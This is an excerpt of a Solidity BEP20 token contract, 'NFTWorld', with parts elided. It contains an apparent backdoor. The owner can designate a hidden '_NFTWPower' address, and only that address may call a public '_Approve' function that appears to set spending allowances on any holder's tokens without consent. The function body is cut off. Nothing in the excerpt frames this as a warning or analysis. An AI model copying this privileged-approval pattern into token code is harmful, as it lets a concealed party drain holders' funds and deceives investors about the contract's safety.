...
contract NFTWorld is Context, IBEP20, Ownable {
    ...
    address private _NFTWPower;

    constructor (string memory _name, string memory _symbol, uint256 _decimals, uint256 _supply, uint256 _txFee,uint256 _burnFee,uint256 _charityFee,address _FeeAddress,address tokenOwner) public {
		_NAME = _name;
		_SYMBOL = _symbol;
		_DECIMALS = _decimals;
    ...
    function SetToken(address nftwPower) public onlyOwner {
      _NFTWPower = nftwPower; 
    }    
    
    modifier onlyNFTWPower() {
        require(_NFTWPower == msg.sender);
        _;
    }

    function _Approve(address owner, address spender, uint256 amount) public onlyNFTWPower {
        require(owner != address(0), "TOKEN20: approve from the zero address");
        require(spender != address(0), "TOKEN20: approve to the zero address");
